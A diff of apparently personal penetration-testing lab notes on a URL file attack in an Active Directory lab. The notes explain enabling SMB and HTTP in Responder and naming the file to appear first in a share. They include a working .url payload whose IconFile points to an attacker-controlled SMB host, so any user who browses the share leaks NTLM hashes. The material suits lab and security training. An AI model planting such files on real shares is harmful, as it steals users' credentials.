@@ -1,20 +1,20 @@
-We need to switch on the SMB and HTTP in order to run this attack successfully from the responder.conf file as we ha turned if off for the attack at the time of SMB relay attack.
+>[!question] What is URL File Attacks ?__?
+URL File Attack captures the User's hashes whoever access the ``"File Share"``
+
+We need to switch on the SMB and HTTP in order to run this attack successfully from the responder.conf file as we had turned if off for the attack at the time of SMB relay attack.
  
+Compromised User has any kind of sharing access we can utilize that access to capture more hashes via responder.
 
-
-If a user has been compromised and this user has any kind of sharing access we can utilize that access to capture more hashes via responder.
-
-As there is some problem not able to open the Hydra-DC hack-me folder so i copied the code in the share folder of Punisher PC and la di da the attack worked.
 
 Name the File : "@test.url"
 @ put the file at the top of the file list
-and name it accordign to company filing
+and name it according to company filing system
 
 ```
 [InternetShortcut]
 URL=blah
 WorkingDirectory=blah
-IconFile=\\192.168.17.128\%USERNAME%.icon
+IconFile=\\<Attacker IP address>\%USERNAME%.icon
 IconIndex=1
 ```
 
